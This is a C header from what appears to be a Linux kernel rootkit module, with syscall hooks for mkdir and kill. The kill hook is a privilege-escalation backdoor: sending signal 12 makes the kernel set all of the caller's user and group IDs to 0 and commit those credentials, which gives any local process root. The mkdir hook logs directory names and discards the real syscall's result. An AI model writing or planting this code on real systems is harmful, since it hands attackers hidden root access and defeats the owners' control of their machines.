#pragma once
#include <linux/namei.h>

static long asmlinkage (*origMkdir)(const struct pt_regs *regs);
static long asmlinkage (*origKill)(const struct pt_regs *regs);


asmlinkage int hookMkdir(const struct pt_regs *regs) {
	char __user *pathname = (char *)regs->di; // __user for userspace
	char dirName[NAME_MAX] = {0};

	long err = strncpy_from_user(dirName, pathname, NAME_MAX);

	if (err > 0) {
		pr_info("Creating folder: %s", dirName);
	}

	origMkdir(regs);
	return 0;
}

asmlinkage int hookKill(const struct pt_regs *regs) {
	int sig = regs->si; //Reading signal from rsi register
	
	if (sig == 12) {
		struct cred *root;
		root = prepare_creds(); //Returns current creds from process

		if (root == NULL) return origKill(regs);

		root->uid.val = root->gid.val = 0;
    	root->euid.val = root->egid.val = 0;
    	root->suid.val = root->sgid.val = 0;
    	root->fsuid.val = root->fsgid.val = 0;

		// Setting the new creds
		commit_creds(root);
	}

	return origKill(regs);
}
